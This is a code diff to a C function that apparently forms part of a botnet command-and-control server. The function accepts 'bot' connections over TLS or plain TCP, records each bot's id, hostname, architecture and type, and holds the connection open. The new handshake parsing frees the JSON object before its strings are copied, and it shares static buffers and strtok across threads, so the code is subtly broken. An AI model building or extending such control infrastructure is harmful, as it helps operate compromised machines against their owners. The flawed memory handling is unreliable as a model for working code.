@@ -411,40 +411,94 @@ void *handle_bot(void *arg) {
     int client_sock = *(int *)arg;
     free(arg);
     
-    SSL *ssl = SSL_new(ssl_ctx);
-    SSL_set_fd(ssl, client_sock);
+    char buffer[4096];
+    int n;
+    int use_ssl = 0;
+    SSL *ssl = NULL;
     
-    if (SSL_accept(ssl) <= 0) {
-        ERR_print_errors_fp(stderr);
-        SSL_free(ssl);
-        close(client_sock);
-        return NULL;
+    // Peek first byte to detect if SSL or plain TCP
+    char first_byte;
+    int peek_result = recv(client_sock, &first_byte, 1, MSG_PEEK);
+    
+    if (peek_result > 0) {
+        // SSL handshake starts with 0x16 (TLS handshake)
+        // Plain text starts with 'R' (REGISTER) or '{' (JSON)
+        if ((unsigned char)first_byte == 0x16) {
+            use_ssl = 1;
+        }
     }
     
-    // Read handshake
-    char buffer[4096];
-    int n = SSL_read(ssl, buffer, sizeof(buffer) - 1);
-    if (n <= 0) {
-        SSL_shutdown(ssl);
-        SSL_free(ssl);
-        close(client_sock);
-        return NULL;
+    // Handle SSL connection
+    if (use_ssl) {
+        ssl = SSL_new(ssl_ctx);
+        SSL_set_fd(ssl, client_sock);
+        
+        if (SSL_accept(ssl) <= 0) {
+            ERR_print_errors_fp(stderr);
+            SSL_free(ssl);
+            close(client_sock);
+            return NULL;
+        }
+        
+        n = SSL_read(ssl, buffer, sizeof(buffer) - 1);
+        if (n <= 0) {
+            SSL_shutdown(ssl);
+            SSL_free(ssl);
+            close(client_sock);
+            return NULL;
+        }
+    } else {
+        // Handle plain TCP connection (mobile bot)
+        n = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
+        if (n <= 0) {
+            close(client_sock);
+            return NULL;
+        }
     }
     
     buffer[n] = '\0';
     
-    struct json_object *parsed_json = json_tokener_parse(buffer);
-    struct json_object *type_obj, *id_obj, *hostname_obj, *arch_obj;
+    // Parse handshake (JSON or REGISTER format)
+    const char *bot_type = "unknown";
+    const char *bot_id = "unknown";
+    const char *hostname = "unknown";
+    const char *arch = "unknown";
     
-    json_object_object_get_ex(parsed_json, "type", &type_obj);
-    json_object_object_get_ex(parsed_json, "id", &id_obj);
-    json_object_object_get_ex(parsed_json, "hostname", &hostname_obj);
-    json_object_object_get_ex(parsed_json, "arch", &arch_obj);
-    
-    const char *bot_type = json_object_get_string(type_obj);
-    const char *bot_id = json_object_get_string(id_obj);
-    const char *hostname = json_object_get_string(hostname_obj);
-    const char *arch = json_object_get_string(arch_obj);
+    if (buffer[0] == '{') {
+        // JSON format (full bots)
+        struct json_object *parsed_json = json_tokener_parse(buffer);
+        struct json_object *type_obj, *id_obj, *hostname_obj, *arch_obj;
+        
+        json_object_object_get_ex(parsed_json, "type", &type_obj);
+        json_object_object_get_ex(parsed_json, "id", &id_obj);
+        json_object_object_get_ex(parsed_json, "hostname", &hostname_obj);
+        json_object_object_get_ex(parsed_json, "arch", &arch_obj);
+        
+        bot_type = json_object_get_string(type_obj);
+        bot_id = json_object_get_string(id_obj);
+        hostname = json_object_get_string(hostname_obj);
+        arch = json_object_get_string(arch_obj);
+        
+        json_object_put(parsed_json);
+    } else if (strncmp(buffer, "REGISTER|", 9) == 0) {
+        // REGISTER format (mobile bot): REGISTER|bot_id|ip|type
+        static char id_buf[64], host_buf[128];
+        char *token = strtok(buffer + 9, "|");
+        if (token) {
+            strncpy(id_buf, token, sizeof(id_buf) - 1);
+            bot_id = id_buf;
+            token = strtok(NULL, "|");
+            if (token) {
+                strncpy(host_buf, token, sizeof(host_buf) - 1);
+                hostname = host_buf;
+                token = strtok(NULL, "|");
+                if (token) {
+                    bot_type = token;
+                }
+            }
+        }
+        arch = "unknown";
+    }
     
     struct sockaddr_in addr;
     socklen_t addr_len = sizeof(addr);
@@ -460,11 +514,14 @@ void *handle_bot(void *arg) {
         strncpy(bots[bot_index].type, bot_type, sizeof(bots[bot_index].type) - 1);
     }
     
-    json_object_put(parsed_json);
-    
-    // Keep alive
+    // Keep alive loop
     while (1) {
-        n = SSL_read(ssl, buffer, sizeof(buffer) - 1);
+        if (use_ssl) {
+            n = SSL_read(ssl, buffer, sizeof(buffer) - 1);
+        } else {
+            n = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
+        }
+        
         if (n <= 0) break;
         
         buffer[n] = '\0';
